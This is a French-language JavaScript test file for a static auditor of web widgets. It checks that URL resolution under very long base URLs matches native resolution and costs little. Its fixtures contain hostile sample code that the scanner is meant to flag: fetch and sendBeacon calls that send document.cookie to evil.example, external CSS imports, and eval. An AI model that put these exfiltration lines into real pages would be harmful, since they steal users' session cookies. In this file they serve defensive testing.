import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { preparerBase, resoudre, resoudreSousBaseLongue, MARQUEUR, PLAFOND_CHEMIN, CHEMIN_TROP_LONG, SEUIL_BASE_LONGUE, ORIGINE_LOCALE } from '../src/moteur/base-url.js';
import { urlDe, cheminLocal } from '../src/moteur/page-html.js';
import { construireContexte } from '../src/contexte/inventaire.js';
import { analyseStatique } from '../src/moteur/statique.js';

/**
 * Une base longue ne change jamais, même en silence, ce qui est audité (règle
 * de la coordination, 2026-09-29) : la référence se résout comme contre la
 * base entière, en un temps qui ne dépend pas de sa longueur. Ce que la
 * substitution garantit se prouve de trois façons :
 *  - par comparaison avec `new URL(référence, base)`, propriété par propriété,
 *    sur des dizaines de milliers de bases et de références tirées d'un germe
 *    fixe (rejouable) et choisies pour être méchantes (`..`, `%2e`, `\`,
 *    tabulations, autorité, schémas, identifiants, requêtes vides…) ;
 *  - par le coût : aucune résolution ne relit la base longue ;
 *  - par le résultat d'une analyse : la même page, sous une base courte et
 *    sous une base longue, donne les mêmes constats et la même surface.
 */

const PROPRIETES = ['protocol', 'hostname', 'host', 'port', 'origin', 'username', 'password', 'search', 'hash', 'pathname', 'href'];

/** Générateur à germe (mulberry32) : le tirage se rejoue. */
function generateur(germe) {
  let a = germe >>> 0;
  const suivant = () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
  const entier = (n) => Math.floor(suivant() * n);
  const parmi = (liste) => liste[entier(liste.length)];
  return { suivant, entier, parmi, pile: (p = 0.5) => suivant() < p };
}

const HOTES = ['h.example', 'cdn.tiers.example', 'widget.local', '[::1]', '[2001:db8::1]', '127.0.0.1', 'xn--nxasmq6b.example', 'É.example', 'a-b.c.d.example', 'LOCALHOST', 'x'];
const SEGMENTS = ['', 'a', 'b', 'c', 'dir', 'x y', 'é', 'a%20b', 'a.b', '%41', ':', '@', ';x', '..', '.', '%2e%2e', '%2E', 'a\\b', 'app.js', 'f.js', '?', '#'.replace('#', '%23')];
const REQUETES = [null, '', 'q', 'a=b&c=d', 'x/y/../z', '?', 'é', 'q/..'];
const FRAGMENTS = [null, '', 'f', 'a/b', 'é'];
const SEGMENTS_REF = ['..', '.', 'x', 'y.js', '', '%2e%2e', '.%2e', '%2e.', '%2E%2E', 'a b', 'é', 'z%20', '..', '..', '.'];
const SCHEMAS = ['http', 'https', 'HTTP', 'Https', 'ftp', 'file', 'ws', 'data', 'javascript', 'mailto', 'about', 'blob', 'foo'];

function baseAleatoire(g) {
  const schema = g.parmi(['http', 'https']);
  const identifiants = g.pile(0.25) ? `${g.parmi(['u', 'us er', 'é'])}${g.pile() ? `:${g.parmi(['p', 'pw d', ''])}` : ''}@` : (g.pile(0.05) ? ':seul@' : '');
  const port = g.pile(0.3) ? `:${g.parmi([80, 443, 8080, 65535, 0])}` : '';
  const segments = Array.from({ length: g.entier(9) }, () => g.parmi(SEGMENTS));
  const requete = g.parmi(REQUETES);
  const fragment = g.parmi(FRAGMENTS);
  const texte = `${schema}://${identifiants}${g.parmi(HOTES)}${port}${segments.length || g.pile() ? '/' : ''}${segments.join(g.pile(0.9) ? '/' : '\\')}${requete === null ? '' : `?${requete}`}${fragment === null ? '' : `#${fragment}`}`;
  try { return new URL(texte); } catch { return null; }
}

function cheminRelatif(g) {
  const n = g.entier(7);
  const segments = Array.from({ length: n }, () => g.parmi(SEGMENTS_REF));
  return segments.join(g.pile(0.85) ? '/' : '\\') + (g.pile(0.3) ? '/' : '');
}

function referenceAleatoire(g) {
  let ref;
  switch (g.entier(11)) {
    case 0: ref = ''; break;
    case 1: ref = cheminRelatif(g); break;
    case 2: ref = `/${cheminRelatif(g)}`; break;
    case 3: ref = `//${g.pile(0.3) ? 'u:p@' : ''}${g.parmi([...HOTES, 'autre.example', 'AUTRE.example:8080'])}/${cheminRelatif(g)}`; break;
    case 4: ref = `?${g.parmi(REQUETES) ?? ''}`; break;
    case 5: ref = `#${g.parmi(FRAGMENTS) ?? ''}`; break;
    case 6: ref = `${g.parmi(SCHEMAS)}:${g.parmi(['//h.example/x', 'x', '/x', '', '//', '///x', '\\\\h\\x', 'x/../y'])}`; break;
    case 7: ref = `${cheminRelatif(g)}?${g.parmi(REQUETES) ?? ''}#${g.parmi(FRAGMENTS) ?? ''}`; break;
    case 8: ref = `\\\\${g.parmi(HOTES)}\\${cheminRelatif(g)}`; break;
    case 9: ref = `../`.repeat(g.entier(12)) + g.parmi(['x.js', '', '.', '..', 'a/../b']); break;
    default: ref = `${g.parmi(['http', 'https'])}:${cheminRelatif(g)}`; break;
  }
  // Ce que l'analyseur d'URL retire : tabulations et sauts de ligne partout, blancs et contrôles aux deux bouts.
  if (g.pile(0.2)) {
    const i = g.entier(ref.length + 1);
    ref = ref.slice(0, i) + g.parmi(['\t', '\n', '\r']) + ref.slice(i);
  }
  if (g.pile(0.1)) ref = `${g.parmi([' ', '\u0001', '\t\n'])}${ref}${g.parmi([' ', '\u001f'])}`;
  return ref;
}

function resultatNaif(ref, base) {
  try { return new URL(ref, base); } catch { return null; }
}
function resultatSubstitue(ref, base) {
  try { return resoudre(ref, base); } catch { return null; }
}

function comparer(ref, base, baseUrl, contexte) {
  const attendu = resultatNaif(ref, baseUrl);
  const obtenu = resultatSubstitue(ref, base);
  if (attendu === null || obtenu === null) {
    assert.equal(obtenu === null, attendu === null, `${contexte} : ${JSON.stringify(ref)} contre ${baseUrl.href} : ${attendu ? 'se résout' : 'échoue'} en direct, ${obtenu ? 'se résout' : 'échoue'} par substitution`);
    return null;
  }
  for (const p of PROPRIETES) {
    assert.equal(obtenu[p], attendu[p], `${contexte} : ${p} de ${JSON.stringify(ref)} contre ${baseUrl.href}`);
  }
  return attendu;
}

test('substitution : 40 000 couples base/référence tirés au hasard donnent, propriété par propriété, ce que donne la base entière', () => {
  const g = generateur(20260929);
  let comparaisons = 0;
  let depuisBase = 0;
  let succes = 0;
  for (let i = 0; i < 5000; i++) {
    const baseUrl = baseAleatoire(g);
    if (!baseUrl) continue;
    const base = preparerBase(baseUrl, 0);                  // seuil 0 : la substitution même pour une base courte
    assert.ok(base.longue, 'seuil 0 : toute base http(s) passe par la substitution');
    for (let j = 0; j < 8; j++) {
      const ref = referenceAleatoire(g);
      const attendu = comparer(ref, base, baseUrl, `couple ${i}.${j}`);
      comparaisons++;
      if (attendu) {
        succes++;
        if (attendu.hostname === baseUrl.hostname && attendu.protocol === baseUrl.protocol) depuisBase++;
      }
    }
  }
  // Un tirage qui n'éprouve pas le cas visé ne prouve rien : la plupart des références doivent se résoudre, et beaucoup sous l'hôte de la base.
  assert.ok(comparaisons >= 30000, `${comparaisons} comparaisons`);
  assert.ok(succes > comparaisons * 0.7, `${succes} résolutions sur ${comparaisons}`);
  assert.ok(depuisBase > comparaisons * 0.3, `${depuisBase} résultats sous l'hôte de la base`);
});

test('substitution : des bases à beaucoup de segments et des références qui en remontent beaucoup, aux deux bords du compte', () => {
  const g = generateur(7);
  for (let i = 0; i < 400; i++) {
    const n = 1 + g.entier(40);
    const chemin = Array.from({ length: n }, (_, k) => (g.pile(0.1) ? '' : `s${k}`)).join('/');
    const baseUrl = new URL(`https://cdn.tiers.example/${chemin}${g.pile() ? '/' : ''}`);
    const base = preparerBase(baseUrl, 0);
    for (let remontees = 0; remontees <= n + 3; remontees++) {
      for (const suite of ['', 'x.js', '.', '..', 'a/b/', '?q', '#f']) {
        comparer(`${'../'.repeat(remontees)}${suite}`, base, baseUrl, `base ${chemin} remontées ${remontees}`);
        comparer(`${'..\\'.repeat(remontees)}${suite}`, base, baseUrl, `base ${chemin} remontées \\ ${remontees}`);
        comparer(`${'%2e%2e/'.repeat(remontees)}${suite}`, base, baseUrl, `base ${chemin} remontées %2e ${remontees}`);
        // Une remontée que suit une descente, qui retire un segment de la référence et non de la base.
        comparer(`${'a/../'.repeat(remontees)}${'../'.repeat(remontees)}${suite}`, base, baseUrl, `base ${chemin} descentes ${remontees}`);
      }
    }
  }
});

test('substitution : une référence qui contient le jeton de substitution se résout contre la vraie base', () => {
  const baseUrl = new URL('https://cdn.tiers.example/a/b/c?x#y');
  const base = preparerBase(baseUrl, 0);
  for (const ref of [`${MARQUEUR}`, `x/${MARQUEUR}n1/y`, `//h${MARQUEUR}.invalid/x`, `//H${MARQUEUR.toUpperCase()}.INVALID/x`, `?${MARQUEUR}`, `/s${MARQUEUR}p/${MARQUEUR.toUpperCase()}`, `h${MARQUEUR}.invalid`]) {
    comparer(ref, base, baseUrl, 'jeton dans la référence');
  }
  // Le résultat est alors un vrai URL : rien du jeton ne s'y mêle.
  assert.equal(resoudreSousBaseLongue(`//h${MARQUEUR}.invalid/x`, base.longue).hostname, `h${MARQUEUR}.invalid`);
  assert.equal(resoudreSousBaseLongue(`//H${MARQUEUR.toUpperCase()}.INVALID/x`, base.longue).hostname, `h${MARQUEUR}.invalid`, 'l\'analyseur d\'URL met l\'hôte en minuscules : la casse ne cache pas le jeton');
});

test('substitution : identifiants, requête vide, requête absente, hôte IPv6 et port de la base', () => {
  const cas = [
    'https://u:p@h.example:8443/a/b?q=1#f', 'https://u@h.example/a/b', 'https://:p@h.example/a', 'http://h.example:80/a?', 'http://h.example/a?#',
    'https://[::1]:8080/a/b/c', 'https://h.example', 'https://h.example/', 'https://h.example//a//b//', 'https://xn--nxasmq6b.example/é/ü',
    'https://h.example/a#f?q', 'https://h.example/a?q#x?y', 'https://h.example/a#?',
  ];
  for (const texte of cas) {
    const baseUrl = new URL(texte);
    const base = preparerBase(baseUrl, 0);
    for (const ref of ['', '?', '?x', '#', '#f', 'x', './x', '../x', '../../x', '/x', '//autre.example/x', 'http:x', 'https:x', 'ftp:x', 'data:,x', '.', '..', './..']) {
      comparer(ref, base, baseUrl, texte);
    }
  }
});

/** Les bases de substitution (des chaînes) que `resoudre` donne au constructeur d'URL pendant `fn`. */
function substitutsPendant(fn) {
  const Original = globalThis.URL;
  const vus = [];
  class Espion extends Original {
    constructor(entree, base) {
      if (typeof base === 'string') vus.push(base);
      super(entree, base);
    }
  }
  globalThis.URL = Espion;
  try { fn(); } finally { globalThis.URL = Original; }
  return vus;
}

/** La base de substitution qu'une base longue donne à une référence d'un segment. */
const substitutDe = (texte, ref = 'x') => {
  const vus = substitutsPendant(() => resoudre(ref, preparerBase(new URL(texte), 0)));
  assert.equal(vus.length, 1, `${texte} : une base de substitution attendue, ${vus.length} vues`);
  return vus[0];
};

// Le comportement d'un analyseur d'URL sur une requête vide héritée (`new URL('', 'http://h/a?')`) change d'une version à l'autre
// (Node 22.22, ada 2.9 : elle est retirée ; le standard la garde). Une comparaison au constructeur natif ne voit donc pas si la
// substitution la copie : ce test regarde la base de substitution elle-même, qui doit avoir la structure de la base (une requête
// vide reste vide, une requête d'un `?` dans le fragment n'en est pas une, les identifiants et le port suivent), quelle que soit la
// version de l'analyseur qui la lira.
test('substitution : la base de substitution reproduit la structure de la base (identifiants, port, requête vide, « ? » du fragment)', () => {
  const M = MARQUEUR;
  const hote = `h${M}\\.invalid`;
  const cas = [
    ['https://h.example/a/b', new RegExp(`^https://${hote}/[^?@]*$`), 'ni identifiants, ni port, ni requête'],
    ['http://h.example/a/b', new RegExp(`^http://${hote}/[^?@]*$`), 'le schéma est celui de la base'],
    ['https://u@h.example/a/b', new RegExp(`^https://u${M}@${hote}/[^?]*$`), 'un utilisateur sans mot de passe'],
    ['https://:p@h.example/a/b', new RegExp(`^https://:w${M}@${hote}/[^?]*$`), 'un mot de passe sans utilisateur : aucun utilisateur inventé'],
    ['https://u:p@h.example/a/b', new RegExp(`^https://u${M}:w${M}@${hote}/[^?]*$`), 'un utilisateur et un mot de passe'],
    ['https://h.example:8443/a/b', new RegExp(`^https://${hote}:8443/[^?@]*$`), 'le port de la base'],
    ['https://h.example:443/a/b', new RegExp(`^https://${hote}/[^?@:]*$`), 'le port par défaut disparaît de la base, donc du substitut'],
    ['https://h.example/a/b?', new RegExp(`^https://${hote}/[^?@]*\\?$`), 'une requête vide reste vide (un « ? » sans jeton)'],
    ['https://h.example/a/b?q=1', new RegExp(`^https://${hote}/[^?@]*\\?q${M}$`), 'une requête non vide devient un jeton'],
    ['https://h.example/a/b#x?y', new RegExp(`^https://${hote}/[^?@]*$`), 'un « ? » du fragment n\'est pas une requête'],
    ['https://h.example/a/b?#x?y', new RegExp(`^https://${hote}/[^?@]*\\?$`), 'une requête vide suivie d\'un fragment à « ? »'],
    ['https://h.example/a/b?q#x?y', new RegExp(`^https://${hote}/[^?@]*\\?q${M}$`), 'une requête suivie d\'un fragment à « ? »'],
  ];
  for (const [texte, motif, dit] of cas) {
    const substitut = substitutDe(texte);
    assert.match(substitut, motif, `${texte} : ${dit} (substitut ${substitut})`);
  }
});

test('substitution : une base non http(s) ne charge rien, longue elle devient about:blank sans changer aucun verdict', () => {
  const longue = 'a'.repeat(SEUIL_BASE_LONGUE + 10);
  for (const texte of [`ftp://h.example/${longue}`, `file:///${longue}`, `ws://h.example/${longue}`, `wss://h.example/${longue}`, `foo://h.example/${longue}`, `blob:https://h.example/${longue}`, `about:${longue}`]) {
    const baseUrl = new URL(texte);
    const base = preparerBase(baseUrl);
    assert.equal(base.url.href, 'about:blank', texte.slice(0, 20));
    for (const ref of ['x.js', '../x.js', '/x.js', '//h.example/x.js', '?x', '#f', '', 'http://h.example/x.js', 'https://widget.local/x.js', 'http:x.js', 'https:x.js', 'ftp:x', 'data:,x']) {
      const attendu = resultatNaif(ref, baseUrl);
      const obtenu = resultatSubstitue(ref, base);
      // Ce que lit une règle : une URL http(s), ou rien. L'une et l'autre base rendent la même.
      const lu = (u) => (u && /^https?:$/.test(u.protocol) ? [u.protocol, u.hostname, u.pathname, u.origin] : null);
      assert.deepEqual(lu(obtenu), lu(attendu), `${texte.slice(0, 20)}… ${ref}`);
    }
  }
});

test('substitution : un chemin de résultat de PLAFOND_CHEMIN caractères se rend en entier, un de plus est remplacé par un chemin qui ne désigne aucun fichier', () => {
  const chemin = (n) => `/${'a'.repeat(n - 1)}`;
  const juste = new URL(`https://widget.local${chemin(PLAFOND_CHEMIN)}`);
  const trop = new URL(`https://widget.local${chemin(PLAFOND_CHEMIN + 1)}`);
  assert.equal(resoudre('', preparerBase(juste, 0)).pathname, juste.pathname, 'au plafond : entier');
  assert.equal(resoudre('', preparerBase(trop, 0)).pathname, CHEMIN_TROP_LONG, 'au-dessus : remplacé');
  assert.ok(cheminLocal(resoudre('', preparerBase(trop, 0))).includes('\0'), 'ce chemin contient un caractère absent de tout nom de fichier');
  // Un préfixe long que la référence ne remonte pas, et qui suffit à dépasser le plafond.
  const repertoires = `${'r'.repeat(99)}/`.repeat(400);
  const profonde = new URL(`https://widget.local/${repertoires}f.js`);
  assert.equal(resoudre('x.js', preparerBase(profonde, 0)).pathname, CHEMIN_TROP_LONG);
  assert.equal(resoudre('../x.js', preparerBase(profonde, 0)).pathname, CHEMIN_TROP_LONG);
  // Remonté assez, le résultat repasse sous le plafond et redevient exact.
  const remonte = `${'../'.repeat(390)}x.js`;
  assert.equal(resoudre(remonte, preparerBase(profonde, 0)).pathname, new URL(remonte, profonde).pathname);
  assert.ok(new URL(remonte, profonde).pathname.length < PLAFOND_CHEMIN);
  // href porte le même remplacement, hôte et origine restent exacts.
  const r = resoudre('x.js', preparerBase(profonde, 0));
  assert.equal(r.href, `https://widget.local${CHEMIN_TROP_LONG}`);
  assert.equal(r.origin, ORIGINE_LOCALE);
});

test('plafond : à la limite exacte, sous tous les découpages en segments de tête et segments gardés', () => {
  for (const segments of [1, 2, 3, 4, 10, 200]) {
    // Un chemin de `segments` segments de répertoire égaux, puis un fichier ; la référence complète le résultat jusqu'à la longueur voulue.
    const repertoire = 'r'.repeat(Math.max(1, Math.floor(20000 / segments)));
    const base = new URL(`https://widget.local/${`${repertoire}/`.repeat(segments)}f.js`);
    const prepare = preparerBase(base, 0);
    const tete = `/${`${repertoire}/`.repeat(segments)}`.length;
    for (const [ecart, attendu] of [[0, 'exact'], [1, 'remplace'], [-1, 'exact']]) {
      const ref = 'x'.repeat(PLAFOND_CHEMIN + ecart - tete);
      const r = resoudre(ref, prepare);
      const direct = new URL(ref, base).pathname;
      assert.equal(direct.length, PLAFOND_CHEMIN + ecart, 'le cas est bien calé sur le plafond');
      assert.equal(r.pathname, attendu === 'exact' ? direct : CHEMIN_TROP_LONG, `${segments} segments, écart ${ecart}`);
    }
  }
});

test('plafond : une référence dont le chemin dépasse seule le plafond donne, elle aussi, un chemin sans fichier, sous une base courte comme sous une base longue', () => {
  const ref = 'b'.repeat(PLAFOND_CHEMIN);
  assert.equal(resoudre(ref, preparerBase(new URL('https://widget.local/a/'), 0)).pathname, CHEMIN_TROP_LONG);
  assert.equal(resoudre('x', preparerBase(new URL(`https://widget.local/${'a'.repeat(SEUIL_BASE_LONGUE)}/`))).pathname, `/${'a'.repeat(SEUIL_BASE_LONGUE)}/x`, 'sous le plafond : exact');
});

test('mémoire : une base ne garde que quelques préfixes, même quand chaque référence en demande un autre', () => {
  const base = preparerBase(new URL(`https://widget.local/${'d/'.repeat(100)}f.js`), 0);
  for (let remontees = 0; remontees < 40; remontees++) resoudre(`${'../'.repeat(remontees)}x.js`, base).pathname;
  assert.ok(base.longue.prefixes.size <= 8, `${base.longue.prefixes.size} préfixes gardés`);
});

// Le coût -----------------------------------------------------------------------

/** Total des caractères que reçoivent les constructeurs d'URL pendant `fn` : la base comprise, comptée par `href`. */
function caracteresLusParURL(fn) {
  const Original = globalThis.URL;
  let total = 0;
  class Espion extends Original {
    constructor(entree, base) {
      total += String(entree).length;
      if (base !== undefined) total += typeof base === 'string' ? base.length : base.href.length;
      super(entree, base);
    }
  }
  globalThis.URL = Espion;
  try { fn(); } finally { globalThis.URL = Original; }
  return total;
}

test('coût : 2 000 références sous une base de 1 Mio (requête, chemin, hôte, identifiants) ne relisent jamais la base', () => {
  const Mio = 1 << 20;
  const bases = {
    requete: `https://widget.local/sous/?${'a'.repeat(Mio)}`,
    'un seul segment': `https://cdn.tiers.example/${'a'.repeat(Mio)}`,
    'segments nombreux': `https://cdn.tiers.example/${'a/'.repeat(Mio / 2)}f.js`,
    hote: `https://${'a'.repeat(60000)}.example/x/`,
    identifiants: `https://${'u'.repeat(Mio / 2)}:${'p'.repeat(Mio / 2)}@cdn.tiers.example/x/`,
    fragment: `https://cdn.tiers.example/x/#${'f'.repeat(Mio)}`,
  };
  for (const [nom, texte] of Object.entries(bases)) {
    const baseUrl = new URL(texte);
    const base = preparerBase(baseUrl);
    assert.ok(base.longue, `${nom} : base longue`);
    const lu = caracteresLusParURL(() => {
      for (let i = 0; i < 2000; i++) {
        const r = resoudre(i % 3 === 0 ? `app${i}.js` : i % 3 === 1 ? `../lib/${i}.js` : `/abs/${i}.js`, base);
        r.hostname; r.protocol; r.origin; r.pathname;
      }
    });
    // Une résolution lit quelques centaines de caractères (la référence et sa base de substitution), jamais la base : une seule base entière en vaut plus de 60 000.
    assert.ok(lu < 2000 * 400, `${nom} : ${lu} caractères lus par 2 000 résolutions (une base entière en vaut ${texte.length})`);
  }
});

test('coût : sous une base à 500 000 segments, une référence qui remonte peu ne construit qu\'une base de substitution courte', () => {
  const baseUrl = new URL(`https://cdn.tiers.example/${'a/'.repeat(500000)}f.js`);
  const base = preparerBase(baseUrl);
  const lu = caracteresLusParURL(() => { for (let i = 0; i < 1000; i++) resoudre('../x.js', base).pathname; });
  assert.ok(lu < 1000 * 400, `${lu} caractères`);
  // Beaucoup de remontées : la substitution suit la référence, jamais la base.
  const lu2 = caracteresLusParURL(() => resoudre('../'.repeat(2000), base).pathname);
  assert.ok(lu2 < 200_000, `${lu2} caractères pour 2 000 remontées (${'../'.repeat(2000).length} dans la référence)`);
});

test('coût : par urlDe, la base brute d\'une page n\'est lue qu\'une fois pour toutes ses références', () => {
  const brute = `https://cdn.tiers.example/${'a/'.repeat(1 << 19)}`;
  const lu = caracteresLusParURL(() => {
    for (let i = 0; i < 2000; i++) urlDe(`x${i}.js`, brute, 'index.html').hostname;
  });
  // Lire la base une fois coûte un peu plus d'un Mio ; la relire à chaque référence, plus de 2 Gio.
  assert.ok(lu < 3 * (1 << 20), `${lu} caractères lus par 2 000 références`);
});

test('coût : le seuil décide seul du chemin pris, une base courte se résout directement', () => {
  const court = preparerBase(new URL('https://cdn.tiers.example/a/'));
  assert.equal(court.longue, null);
  assert.ok(resoudre('x.js', court) instanceof URL);
  const limite = preparerBase(new URL(`https://cdn.tiers.example/${'a'.repeat(SEUIL_BASE_LONGUE - 'https://cdn.tiers.example/'.length)}`));
  assert.equal(limite.longue, null, 'au seuil exactement : direct');
  const audessus = preparerBase(new URL(`https://cdn.tiers.example/${'a'.repeat(SEUIL_BASE_LONGUE - 'https://cdn.tiers.example/'.length + 1)}`));
  assert.ok(audessus.longue, 'un caractère de plus : substitution');
});

// Ce que voit une analyse ---------------------------------------------------------

/** Écrit un widget dans un dossier temporaire, l'analyse, nettoie même en cas d'échec ; rend surface et constats. */
async function analyser(fichiers) {
  // Le nom du dossier audité entre dans un constat (F-GUIDE-01) : un nom fixe, sous un parent temporaire.
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'gwaudit-base-'));
  const racine = path.join(parent, 'widget');
  try {
    for (const [nom, contenu] of Object.entries(fichiers)) {
      fs.mkdirSync(path.dirname(path.join(racine, nom)), { recursive: true });
      fs.writeFileSync(path.join(racine, nom), contenu);
    }
    const ctx = construireContexte(racine);
    const constats = await analyseStatique(ctx, { reseau: false });
    return {
      surface: ctx.fichiers.filter((f) => f.executee).map((f) => f.chemin).sort(),
      constats: constats.map((c) => [c.axe, c.regle, c.fichier, c.ligne, c.severite, Boolean(c.bloquant), c.titre].join(' | ')).sort(),
    };
  } finally {
    fs.rmSync(parent, { recursive: true, force: true });
  }
}

const BASE_COURTE = './?x';
const BASE_LONGUE = `./?${'a'.repeat(SEUIL_BASE_LONGUE + 4)}`;

const WIDGETS = {
  'un script local qui envoie document.cookie': {
    'index.html': (base) => `<!doctype html><html lang="fr"><head><title>t</title><base href="${base}"></head><body><script src="app.js"></script></body></html>`,
    'app.js': () => 'fetch("https://evil.example/c?d=" + document.cookie);\n',
  },
  'une feuille locale qui charge une ressource externe': {
    'index.html': (base) => `<!doctype html><html lang="fr"><head><title>t</title><base href="${base}"><link rel="stylesheet" href="a.css"></head><body>x</body></html>`,
    'a.css': () => '@import url(https://evil.example/x.css);\nbody{background:url(https://evil.example/p.png)}\n',
  },
  'une import map vers un module local qui exécute du texte': {
    'index.html': (base) => `<!doctype html><html lang="fr"><head><title>t</title><base href="${base}"><script type="importmap">{"imports":{"m":"./mod.js"}}</script></head><body><script type="module">import "m";</script></body></html>`,
    'mod.js': () => 'export const f = (x) => eval(x);\n',
  },
  'un module local importé par un module local': {
    'index.html': (base) => `<!doctype html><html lang="fr"><head><title>t</title><base href="${base}"></head><body><script type="module" src="a.js"></script></body></html>`,
    'a.js': () => 'import "./b.js";\n',
    'b.js': () => 'document.write(location.hash);\n',
  },
  'un fragment et une requête dans la référence': {
    'index.html': (base) => `<!doctype html><html lang="fr"><head><title>t</title><base href="${base}"></head><body><script src="app.js?v=1#x"></script></body></html>`,
    'app.js': () => 'navigator.sendBeacon("https://evil.example/b", document.cookie);\n',
  },
};

for (const [nom, modele] of Object.entries(WIDGETS)) {
  test(`analyse : ${nom} — mêmes constats et même surface sous une base courte et sous une base de plus de 4 096 caractères`, async () => {
    const sous = (base) => Object.fromEntries(Object.entries(modele).map(([f, fabrique]) => [f, fabrique(base)]));
    const court = await analyser(sous(BASE_COURTE));
    const long = await analyser(sous(BASE_LONGUE));
    assert.ok(court.surface.length >= 2, `la surface sous une base courte comprend le code local : ${court.surface}`);
    assert.ok(court.constats.some((c) => !/^E \|/.test(c) && !/^F \|/.test(c)), `sous une base courte, ce code local est audité : ${court.constats.length} constats`);
    assert.deepEqual(long.surface, court.surface);
    assert.deepEqual(long.constats, court.constats);
  });
}

test('analyse : la même page sous une base longue relative au dossier de la page, dans un sous-dossier', async () => {
  const fichiers = (base) => ({
    'index.html': `<!doctype html><html lang="fr"><head><title>t</title><base href="${base}"></head><body><script src="app.js"></script></body></html>`,
    'sous/app.js': 'fetch("https://evil.example/c?d=" + document.cookie);\n',
  });
  const court = await analyser(fichiers('sous/?x'));
  const long = await analyser(fichiers(`sous/?${'a'.repeat(SEUIL_BASE_LONGUE + 4)}`));
  assert.ok(court.surface.includes('sous/app.js'));
  assert.deepEqual(long, court);
});

test('urlDe : sous une base externe longue, la référence relative reste chez le tiers, jamais le fichier homonyme local', () => {
  const base = `https://cdn.tiers.example/${'a'.repeat(SEUIL_BASE_LONGUE + 4)}/`;
  const u = urlDe('app.js', base, 'index.html');
  assert.equal(u.hostname, 'cdn.tiers.example');
  assert.equal(cheminLocal(u), null);
  assert.equal(urlDe('//autre.example/x.js', base, 'index.html').hostname, 'autre.example');
  assert.equal(cheminLocal(urlDe('https://widget.local/x.js', base, 'index.html')), 'x.js', 'une URL absolue ne dépend pas de la base');
});
